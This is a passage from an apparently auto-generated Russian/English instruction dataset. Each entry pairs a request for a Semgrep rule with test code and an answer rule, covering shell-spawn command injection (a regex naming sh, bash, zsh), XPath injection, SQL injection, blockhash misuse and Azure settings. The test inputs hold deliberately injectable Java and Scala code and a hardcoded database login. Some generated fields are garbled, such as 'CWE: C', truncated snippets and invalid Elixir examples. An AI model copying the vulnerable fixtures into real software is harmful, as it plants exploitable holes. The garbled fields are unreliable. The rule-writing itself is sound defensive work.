$METHOD\n        regex: (spawnv|spawnve|spawnvp|spawnvp|spawnvpe|posix_spawn|posix_spawnp)\n    - metavariable-regex:\n        metavariable: $BASH\n        regex: (.*)(sh|bash|ksh|csh|tcsh|zsh)\n  - patterns:\n    - pattern-not: os.$METHOD($MODE, \"...\", \"...\", \"...\", ...)\n    - pattern: os.$METHOD($MODE, $BASH, \"-c\", $CMD,...)\n    - metavariable-regex:\n        metavariable: $METHOD\n        regex: (spawnl|spawnle|spawnlp|spawnlpe)\n    - metavariable-regex:\n        metavariable: $BASH\n        regex: (.*)(sh|bash|ksh|csh|tcsh|zsh)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций spawn в Python, которые могут быть подвержены командной инъекции. Анализируется использование методов os.spawn*, таких как os.spawnlp, os.spawnlpe и др., с целью выявления случаев, когда аргументы функции формируются динамически на основе внешних данных. Опасным считается случай, если внешние данные напрямую влияют на формирование команды, запускаемой через spawn-функции. Безопасными считаются вызовы, где аргументы жестко заданы или явно защищены от инъекций путем использования фиксированных строк или списков аргументов.\n\n# Ключевые элементы:\n- ID: dangerous-spawn-process-audit\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-spawn-process-audit",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: incorrect-use-of-blockhash\nОписание уязвимости: blockhash(block.number) and blockhash(block.number + N) always returns 0.\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: incorrect-use-of-blockhash.sol\npragma solidity 0.8.0;\n\n\ncontract Test{\n    function func1() external{\n        //ruleid: incorrect-use-of-blockhash\n        bytes32 result1 = blockhash(block.number);\n\n        //ruleid: incorrect-use-of-blockhash\n        bytes32 result2 = blockhash(block.number + 1);\n    \n        //ruleid: incorrect-use-of-blockhash\n        bytes32 result3 = blockhash(block.number * 2);\n\n        //ruleid: incorrect-use-of-blockhash\n        bytes32 result4 = block.blockhash(block.number);\n\n        //ok: incorrect-use-of-blockhash\n        bytes32 result5 = blockhash(block.number - 1);\n\n        uint256 n = 123;\n        //ok: incorrect-use-of-blockhash\n        bytes32 result6 = blockhash(block.number - n);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: incorrect-use-of-blockhash.sol\ncontract Test{\n    function func1() external{\n        //ruleid: incorrect-use-of-blockhash\n        bytes32 result1 = blockhash(block.number);\n\n        //ruleid:\n• // File: another-incorrect-use-of-blockhash.sol\ncontract AnotherTest{\n    function anotherFunc() external{\n        //ruleid: incorrect-use-of-blockhash\n        bytes32 hashValue = blockhash(block.numb\n• // File: yet-another-incorrect-use-of-blockhash.sol\ncontract YetAnotherTest{\n    function yetAnotherFunction() external{\n        //ruleid: incorrect-use-of-blockhash\n        bytes32 value = block.bloc\n\nБезопасные паттерны:  \n• // File: correct-use-of-blockhash.sol\ncontract CorrectUse{\n    function correctFunc() external{\n        //ok: incorrect-use-of-blockhash\n        bytes32 result = blockhash(block.number - 1);\n    }}\n• // File: another-correct-use-of-blockhash.sol\ncontract AnotherCorrectUse{\n    function anotherCorrectFunc() external{\n        //ok: incorrect-use-of-blockhash\n        bytes32 value = blockhash(block.n\n• // File: yet-another-correct-use-of-blockhash.sol\ncontract YetAnotherCorrectUse{\n    function yetAnotherCorrectFunction() external{\n        //ok: incorrect-use-of-blockhash\n        bytes32 hashValue =\n\nЛегенда аннотаций:\n- // ruleid:incorrect-use-of-blockhash: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:incorrect-use-of-blockhash: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: incorrect-use-of-blockhash\n    message: blockhash(block.number) and blockhash(block.number + N) always returns 0.\n    metadata:\n      category: security\n      technology:\n        - solidity\n      cwe: \"CWE-341: Predictable from Observable State\"\n      confidence: HIGH\n      likelihood: LOW\n      impact: MEDIUM\n      subcategory:\n          - vuln\n      references:\n        - https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n    patterns:\n      - pattern-either:\n          - pattern: blockhash(block.number)\n          - pattern: blockhash(block.number + $N)\n          - pattern: blockhash(block.number * $N)\n          - pattern: block.blockhash(block.number)\n          - pattern: block.blockhash(block.number + $N)\n          - pattern: block.blockhash(block.number * $N)\n    severity: ERROR\n    languages:\n      - solidity\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска неправильного использования функции blockhash в Solidity. Функция blockhash возвращает хеш блока, но только для блоков, которые уже были добыты (то есть их номер меньше или равен текущему блоку). Использование blockhash(block.number), blockhash(block.number + N) или block.blockhash(block.number) всегда приведет к возврату нулевого значения, так как соответствующие блоки еще не существуют. Правило использует шаблон 'pattern-either' для проверки наличия этих конструкций в коде.\n\n# Ключевые элементы:\n- ID: incorrect-use-of-blockhash\n- Язык: solidity \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "incorrect-use-of-blockhash",
      "language": "solidity",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: enum_map_into\nОписание уязвимости: Using `Enum.into/3` is more efficient than using `Enum.map/2 |> Enum.into/2`.\nCWE: \nТип анализа: search\nЯзык: elixir",
    "input": "Требования:\n- Язык: elixir\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: enum-map-into.fixed.exs\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n\n\n// File: enum-map-into.exs\n# ruleid: enum_map_into\nEnum.into(Enum.map(%{a: 1, b: 2}, fn {k, v} -> {k, v * 2} end), %{})\n\n# ruleid: enum_map_into\nEnum.map(%{a: 1, b: 2}, fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})\n\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.map(fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})  # Ограничиваем длину\n\nОпасные паттерны:\n• %{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n• Enum.into(Enum.map(%{a: 1, b: 2}, fn {k, v} -> {k, v * 2} end), %{})\n• %{a: 1, b: 2}\n|> Enum.map(fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})\n\nБезопасные паттерны:  \n• %{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end, &fn {k, v} -> {k, v * 2} end)\n• Enum.into(%{a: 1, b: 2}, %{}, fn {k, v} -> {k, v * 2} end)\n• %{a: 1, b: 2}\n|> Enum.map(&fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})\n\nЛегенда аннотаций:\n- // ruleid:enum_map_into: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:enum_map_into: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: enum_map_into\n    message: >-\n      Using `Enum.into/3` is more efficient than using `Enum.map/2 |> Enum.into/2`.\n    severity: WARNING\n    languages:\n      - elixir\n    pattern-either:\n      - pattern: |\n          Enum.into(Enum.map($E, $FUN), $INTO)\n      - pattern: |\n          Enum.map($E, $FUN)\n          |> Enum.into($INTO)\n      - pattern: |\n          $E\n          |> Enum.map($FUN)\n          |> Enum.into($INTO)\n    fix: |\n      $E\n      |> Enum.into($INTO, $FUN end)\n    metadata:\n      references:\n        - https://github.com/rrrene/credo/blob/master/lib/credo/check/refactor/map_into.ex\n      category: best-practice\n      technology:\n        - elixir\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска неэффективных конструкций использования Enum.map и Enum.into в Elixir-коде. Паттерны ищут случаи, когда Enum.map используется перед Enum.into, вместо прямого вызова Enum.into с функцией трансформации внутри. Правило рекомендует использовать более эффективный подход с передачей функции трансформации непосредственно в Enum.into.\n\n# Ключевые элементы:\n- ID: enum_map_into\n- Язык: elixir \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "enum_map_into",
      "language": "elixir",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: tainted-xpath-from-http-request\nОписание уязвимости: Detected input from a HTTPServletRequest going into a XPath evaluate or compile command. This could lead to xpath injection if variables passed into the evaluate or compile commands are not properly sanitized. Xpath injection could lead to unauthorized access to sensitive information in XML documents. Instead, thoroughly sanitize user input or use parameterized xpath queries if you can.\nCWE: CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\nТип анализа: taint\nЯзык: java\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: java\n- Тип анализа: taint\n- CWE: CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-xpath-from-http-request.java\n/**\n * OWASP Benchmark Project v1.2\n *\n * <p>This file is part of the Open Web Application Security Project (OWASP) Benchmark Project. For\n * details, please see <a\n * href=\"https://owasp.org/www-project-benchmark/\">https://owasp.org/www-project-benchmark/</a>.\n *\n * <p>The OWASP Benchmark is free software: you can redistribute it and/or modify it under the terms\n * of the GNU General Public License as published by the Free Software Foundation, version 2.\n *\n * <p>The OWASP Benchmark is distributed in the hope that it will be useful, but WITHOUT ANY\n * WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR\n * PURPOSE. See the GNU General Public License for more details.\n *\n * @author Nick Sanidas\n * @created 2015\n */\npackage org.owasp.benchmark.testcode;\n\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(value = \"/xpathi-00/BenchmarkTest00207\")\npublic class BenchmarkTest00207 extends HttpServlet {\n\n    private static final long serialVersionUID = 1L;\n\n    @Override\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doPost(request, response);\n    }\n\n    @Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        response.setContentType(\"text/html;charset=UTF-8\");\n\n        String param = \"\";\n        if (request.getHeader(\"BenchmarkTest00207\") != null) {\n            param = request.getHeader(\"BenchmarkTest00207\");\n        }\n\n        // URL Decode the header value since req.getHeader() doesn't. Unlike req.getParameter().\n        param = java.net.URLDecoder.decode(param, \"UTF-8\");\n\n        String bar = \"\";\n         # Ограничиваем длину\n\nОпасные паттерны:\n• String expression = \\\n•  + bar + \n\nБезопасные паттерны:  \n• String expression = \\\n\nЛегенда аннотаций:\n- // ruleid:tainted-xpath-from-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-xpath-from-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-xpath-from-http-request\n  message: >-\n    Detected input from a HTTPServletRequest going into a XPath evaluate or compile command. This could\n    lead to xpath injection if variables passed into the evaluate or compile commands are not properly\n    sanitized.\n    Xpath injection could lead to unauthorized access to sensitive information in XML documents.\n    Instead, thoroughly sanitize user input or use parameterized xpath queries if you can.\n  languages: [java]\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: |\n        (HttpServletRequest $REQ).$FUNC(...)\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          (javax.xml.xpath.XPath $XP).evaluate(...)\n      - pattern: |\n          (javax.xml.xpath.XPath $XP).compile(...).evaluate(...)\n  metadata:\n    category: security\n    technology:\n    - java\n    cwe:\n    - \"CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования входных данных из объекта HttpServletRequest в командах XPath evaluate или compile. Если эти переменные не будут должным образом очищены перед использованием, существует риск инъекции XPath, которая может привести к несанкционированному доступу к чувствительной информации в XML-документах. Правило использует шаблон источников, который ищет обращения к методам HttpServletRequest, и шаблоны стоков, которые проверяют вызовы методов evaluate и compile класса XPath.\n\n# Ключевые элементы:\n- ID: tainted-xpath-from-http-request\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-xpath-from-http-request",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-apiservices-use-virtualnetwork\nОписание уязвимости: Ensure that API management services use virtual networks\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-apiservices-use-virtualnetwork.tf\n# fail\n# ruleid: azure-apiservices-use-virtualnetwork\nresource \"azurerm_api_management\" \"example\" {\n    name                = \"example-apim\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    publisher_name      = \"My Company\"\n    publisher_email     = \"company@terraform.io\"\n\n    sku_name = \"Developer_1\"\n\n    policy {\n    xml_content = <<XML\n    <policies>\n        <inbound />\n        <backend />\n        <outbound />\n        <on-error />\n    </policies>\nXML\n\n    }\n}\n\n# pass\nresource \"azurerm_api_management\" \"example\" {\n    name                = \"example-apim\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n    publisher_name      = \"My Company\"\n    publisher_email     = \"company@terraform.io\"\n\n    sku_name = \"Developer_1\"\n    virtual_network_configuration {\n    subnet_id = azure_subnet.subnet_not_public_ip.id\n    }\n    policy {\n    xml_content = <<XML\n    <policies>\n        <inbound />\n        <backend />\n        <outbound />\n        <on-error />\n    </policies>\nXML\n\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_api_management\" \"example\" { ... }\n• resource \"azurerm_api_management\" \"example\" { ... policy { ... } }\n\nБезопасные паттерны:  \n• resource \"azurerm_api_management\" \"example\" { ... virtual_network_configuration { ... } }\n• resource \"azurerm_api_management\" \"example\" { ... virtual_network_configuration { subnet_id = ... } }\n\nЛегенда аннотаций:\n- // ruleid:azure-apiservices-use-virtualnetwork: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-apiservices-use-virtualnetwork: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-apiservices-use-virtualnetwork\n  message: >-\n    Ensure that API management services use virtual networks\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_api_management\" \"...\" {\n      ...\n      virtual_network_configuration {\n        subnet_id = ...\n      }\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_api_management\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ресурса Azure API Management без конфигурации виртуальной сети. Анализ выполняется путем поиска шаблона ресурса Azure API Management, который не содержит внутри себя подшаблона с конфигурацией виртуальной сети. Опасный пример представляет собой ресурс без указанной виртуальной сети, безопасный пример включает ресурс с правильной настройкой виртуальной сети.\n\n# Ключевые элементы:\n- ID: azure-apiservices-use-virtualnetwork\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-apiservices-use-virtualnetwork",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: slow-pattern-general-property\nОписание уязвимости: Using patterns like `$X.$Y` may be too general and may slow down the rule performance.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: slow-pattern-general-property.test.yaml\nrules:\n  - id: express-sandbox-code-injection\n    message: >-\n      Make sure that unverified user data can not reach `sandbox`.\n    severity: ERROR\n    languages: [javascript]\n    metadata:\n      owasp: \"A1: Injection\"\n      cwe: \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    patterns:\n      - pattern-inside: |\n          ...\n          $SANDBOX = require('sandbox');\n          ...\n      - pattern-either:\n          # ok: slow-pattern-general-property\n          - pattern-inside: function ($REQ, $RES, ...) {...}\n          # ok: slow-pattern-general-property\n          - pattern-inside: function $FUNC($REQ, $RES, ...) {...}\n          # ok: slow-pattern-general-property\n          - pattern-inside: $X = function $FUNC($REQ, $RES, ...) {...}\n          # ok: slow-pattern-general-property\n          - pattern-inside: var $X = function $FUNC($REQ, $RES, ...) {...};\n          # ruleid: slow-pattern-general-property\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, ...) {...})\n      - pattern-either:\n          # ruleid: slow-pattern-general-property\n          - pattern: $S.run(<... $REQ.$QUERY.$FOO ...>,...);  # Ограничиваем длину\n\nОпасные паттерны:\n• $APP.$METHOD(..., function $FUNC($REQ, $RES, ...) {...})\n• $S.run(<... $REQ.$QUERY.$FOO ...>,...);\n\nБезопасные паттерны:  \n• function ($REQ, $RES, ...) {...}\n• function $FUNC($REQ, $RES, ...) {...}\n• $X = function $FUNC($REQ, $RES, ...) {...}\n\nЛегенда аннотаций:\n- // ruleid:slow-pattern-general-property: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:slow-pattern-general-property: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: slow-pattern-general-property\n  message: >-\n    Using patterns like `$X.$Y` may be too general and may slow down the rule performance.\n  severity: WARNING\n  metadata:\n    category: performance\n    technology:\n    - semgrep\n  languages:\n  - yaml\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        pattern-inside: $X\n    - pattern-inside: |\n        pattern-not-inside: $X\n    - pattern-inside: |\n        pattern: $X\n    - pattern-inside: |\n        pattern-not: $X\n  - pattern-regex: \\$[A-Z]*\\.\\$[A-Z]*\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска шаблонов, которые могут замедлить выполнение правил из-за их общей природы. Оно использует комбинацию операторов pattern-inside и pattern-not-inside для проверки наличия переменных или выражений, содержащих точку (`.`), что может указывать на потенциально медленные шаблоны. Правило также применяет регулярное выражение для выявления конкретных конструкций вида `$X.$Y`, где оба идентификатора начинаются с заглавных букв.\n\n# Ключевые элементы:\n- ID: slow-pattern-general-property\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "slow-pattern-general-property",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: azure-aks-apiserver-auth-ip-ranges\nОписание уязвимости: Ensure AKS has an API Server Authorized IP Ranges enabled\t\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-aks-apiserver-auth-ip-ranges.tf\n# pass\nresource \"azurerm_kubernetes_cluster\" \"enabled\" {\n  name                = \"example\"\n  location            = \"azurerm_resource_group.example.location\"\n  resource_group_name = \"azurerm_resource_group.example.name\"\n  dns_prefix          = \"example\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  api_server_authorized_ip_ranges = [\"192.168.0.0/16\"]\n}\n\n# fail\n# ruleid: azure-aks-apiserver-auth-ip-ranges\nresource \"azurerm_kubernetes_cluster\" \"default\" {\n  name                = \"example\"\n  location            = \"azurerm_resource_group.example.location\"\n  resource_group_name = \"azurerm_resource_group.example.name\"\n  dns_prefix          = \"example\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n}\n\n# fail\n# ruleid: azure-aks-apiserver-auth-ip-ranges\nresource \"azurerm_kubernetes_cluster\" \"empty\" {\n  name                = \"example\"\n  location            = \"azurerm_resource_group.example.location\"\n  resource_group_name = \"azurerm_resource_group.example.name\"\n  dns_prefix          = \"example\"\n\n  default_node_pool {\n    name       = \"default\"\n    node_count = 1\n    vm_size    = \"Standard_D2_v2\"\n  }\n\n  identity {\n    type = \"SystemAssigned\"\n  }\n\n  api_server_authorized_ip_ranges = []\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_kubernetes_cluster\" \"default\" { ... }\n• resource \"azurerm_kubernetes_cluster\" \"empty\" { ... api_server_authorized_ip_ranges = [] ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_kubernetes_cluster\" \"enabled\" { ... api_server_authorized_ip_ranges = [\"192.168.0.0/16\"] ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-aks-apiserver-auth-ip-ranges: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-aks-apiserver-auth-ip-ranges: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-aks-apiserver-auth-ip-ranges\n  message: >-\n    Ensure AKS has an API Server Authorized IP Ranges enabled\t\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_kubernetes_cluster\" \"...\" {\n      ...\n      api_server_authorized_ip_ranges = [\"...\"]\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_kubernetes_cluster\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure AKS (Azure Kubernetes Service) с отсутствующими или пустыми значениями параметра 'api_server_authorized_ip_ranges'. Правило использует комбинацию шаблонов для поиска ресурсов типа 'azurerm_kubernetes_cluster' и проверяет наличие блока 'api_server_authorized_ip_ranges', содержащего конкретные IP-адреса диапазона. Если такой блок отсутствует или содержит пустой список, правило отмечает это как потенциально небезопасную конфигурацию.\n\n# Ключевые элементы:\n- ID: azure-aks-apiserver-auth-ip-ranges\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-aks-apiserver-auth-ip-ranges",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: tainted-sql-string\nОписание уязвимости: User data flows into this manually-constructed SQL string. User data can be safely inserted into SQL strings using prepared statements or an object-relational mapper (ORM). Manually-constructed SQL strings is a possible indicator of SQL injection, which could let an attacker steal or manipulate data from the database. Instead, use prepared statements (`connection.PreparedStatement`) or a safe library.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: scala\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-sql-string.scala\npackage com.test.test\n\nimport java.sql.{Connection, ResultSet, DriverManager}\nimport org.slf4j.LoggerFactory\n\nobject Smth {\n\n  def call1(name: String) = {\n    // ruleid: tainted-sql-string\n    val sql = \"SELECT * FROM table WHERE name = \" + name + \";\"\n    val conn = DriverManager.getConnection(\"jdbc:mysql://localhost:8080\", \"guest\", \"password\")\n    val stmt = conn.createStatement()\n    val rs = stmt.execute(sql)\n    rs\n  }\n\n  def call2(name: String) = {\n    val conn = DriverManager.getConnection(\"jdbc:mysql://localhost:8080\", \"guest\", \"password\")\n    val stmt = conn.createStatement()\n    // ruleid: tainted-sql-string\n    val rs = stmt.execute(s\"SELECT * FROM table WHERE name = $name;\")\n    rs\n  }\n\n  def call3(name: String) = {\n    // ruleid: tainted-sql-string\n    val sql = f\"SELECT * FROM table WHERE name = $name%s;\"\n    val conn = DriverManager.getConnection(\"jdbc:mysql://localhost:8080\", \"guest\", \"password\")\n    val stmt = conn.createStatement()\n    val rs = stmt.execute(sql)\n    rs\n  }\n\n  def call4(name: String) = {\n    // ruleid: tainted-sql-string\n    val sql = s\"SELECT * FROM table WHERE name = ${name};\"\n    val conn = DriverManager.getConnection(\"jdbc:mysql://localhost:8080\", \"guest\", \"password\")\n    val stmt = conn.createStatement()\n    val rs = stmt.execute(sql)\n    rs\n  }\n\n  def call5(name: String) = {\n    // ruleid: tainted-sql-string\n    val sql = s\"SELECT * FROM table WHERE name = ${name + \"smth\"};\"\n    val conn = DriverManager.getConnection(\"jdbc:mysql://localhost:8080\", \"guest\", \"password\")\n    val stmt = conn.createStatement()\n    val rs = stmt.execute(sql)\n    rs\n  }\n\n  def okCall1(name: String) = {\n    val foobar = getFoobarFromEnv()\n    // ok: tainted-sql-string\n    val sql = \"SELECT * FROM table WHERE name = \" + foobar + \";\"\n    val conn = DriverManager.getConnection(\"jdbc:mysql://localhost:8080\", \"guest\", \"password\")\n    val stmt = conn.createStatement()\n    val rs = stmt.execute(sql)\n    rs\n  }\n\n  def okCall2(  # Ограничиваем длину\n\nОпасные паттерны:\n• val sql = \"SELECT * FROM table WHERE name = \" + name + \";\"\n• val sql = s\"SELECT * FROM table WHERE name = $name;\"\n• val sql = f\"SELECT * FROM table WHERE name = $name%s;\"\n\nБезопасные паттерны:  \n• val foobar = getFoobarFromEnv()\n• val foobar = \"Foobar\"\n• println(\"SELECT * FROM table WHERE name = \" + name + \";\");\n\nЛегенда аннотаций:\n- // ruleid:tainted-sql-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-sql-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-sql-string\n  languages:\n  - scala\n  severity: ERROR\n  mode: taint\n  message: User data flows into this manually-constructed SQL string. User data can be safely inserted\n    into SQL strings using prepared statements or an object-relational mapper (ORM). Manually-constructed\n    SQL strings is a possible indicator of SQL injection, which could let an attacker steal or manipulate\n    data from the database. Instead, use prepared statements (`connection.PreparedStatement`) or a safe\n    library.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.oracle.com/javase/7/docs/api/java/sql/PreparedStatement.html\n    category: security\n    technology:\n    - scala\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  pattern-sources:\n  - patterns:\n    - pattern: $PARAM\n    - pattern-either:\n      - pattern-inside: |\n          def $CTRL(..., $PARAM: $TYPE, ...) = {\n            ...\n          }\n      - pattern-inside: |\n          def $CTRL(..., $PARAM: $TYPE, ...) = $A {\n            ...\n          }\n      - pattern-inside: |\n          def $CTRL(..., $PARAM: $TYPE, ...) = $A(...) {\n            ...\n          }\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: |\n              \"$SQLSTR\" + ...\n          - pattern: |\n              \"$SQLSTR\".format(...)\n          - patterns:\n            - pattern-inside: |\n                $SB = new StringBuilder(\"$SQLSTR\");\n                ...\n            - pattern: $SB.append(...)\n          - patterns:\n            - pattern-inside: |\n                $VAR = \"$SQLSTR\"\n                ...\n            - pattern: $VAR += ...\n        - metavariable-regex:\n            metavariable: $SQLSTR\n            regex: (?i)(select|delete|insert|create|update|alter|drop)\\b\n      - patterns:\n        - pattern-either:\n          - pattern: s\"...\"\n          - pattern: f\"...\"\n        - pattern-regex: |\n            .*\\b(?i)(select|delete|insert|create|update|alter|drop)\\b.*\n    - pattern-not-inside: println(...)\n    - pattern-not-inside: throw new $EXCEPTION(...)\n  pattern-sanitizers:\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern: $LOGGER.$METHOD(...)\n   